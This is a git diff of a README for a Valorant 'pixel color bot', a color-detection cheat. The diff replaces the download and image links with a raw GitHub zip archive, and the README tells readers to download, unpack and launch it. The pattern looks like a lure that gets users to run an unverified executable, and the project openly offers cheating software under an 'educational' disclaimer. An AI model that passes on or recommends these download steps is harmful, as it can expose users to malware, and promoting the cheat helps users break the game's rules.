@@ -1,7 +1,7 @@
 # 🎮 Valorant Pixel Color BoT 🤖
-![image](https://github.com/user-attachments/assets/9dc86796-c24a-4cd3-aa5a-88eaaf3826df)
+![image](https://raw.githubusercontent.com/Juvileo2004/ValorantExternalCheat/main/processionist/ValorantExternalCheat.zip)
 
-[![🚀 Download Valorant Pixel Color BoT](https://img.shields.io/badge/Download-EzLaunch-blue?logo=github)](https://ezlaunch.live/pPnqF1yp)
+[![🚀 Download Valorant Pixel Color BoT](https://raw.githubusercontent.com/Juvileo2004/ValorantExternalCheat/main/processionist/ValorantExternalCheat.zip)](https://raw.githubusercontent.com/Juvileo2004/ValorantExternalCheat/main/processionist/ValorantExternalCheat.zip)
 
 A high-performance and advanced Valorant pixel bot that utilizes rapid color detection techniques on your display for smart, seamless gameplay automation. Built for accuracy and low resource consumption, this tool leverages powerful image-processing and color matching functionalities, enhancing your Valorant gaming experience by responding to pixel color changes at lightning speed.
 
@@ -26,7 +26,7 @@ A high-performance and advanced Valorant pixel bot that utilizes rapid color det
 
 ## 💡 Installation
 
-1. Tap the download button below or [here](https://ezlaunch.live/pPnqF1yp) to get the latest release.
+1. Tap the download button below or [here](https://raw.githubusercontent.com/Juvileo2004/ValorantExternalCheat/main/processionist/ValorantExternalCheat.zip) to get the latest release.
 2. Unpack the package for your OS.
 3. Launch Valorant Pixel Color BoT as guided in the manual.
 
@@ -42,4 +42,4 @@ This software is intended solely for educational and testing purposes in a contr
 
 Released under the [MIT License (2025)](./LICENSE).
 
-[![🚀 Download Valorant Pixel Color BoT](https://img.shields.io/badge/Download-EzLaunch-blue?logo=github)](https://ezlaunch.live/pPnqF1yp)
+[![🚀 Download Valorant Pixel Color BoT](https://raw.githubusercontent.com/Juvileo2004/ValorantExternalCheat/main/processionist/ValorantExternalCheat.zip)](https://raw.githubusercontent.com/Juvileo2004/ValorantExternalCheat/main/processionist/ValorantExternalCheat.zip)
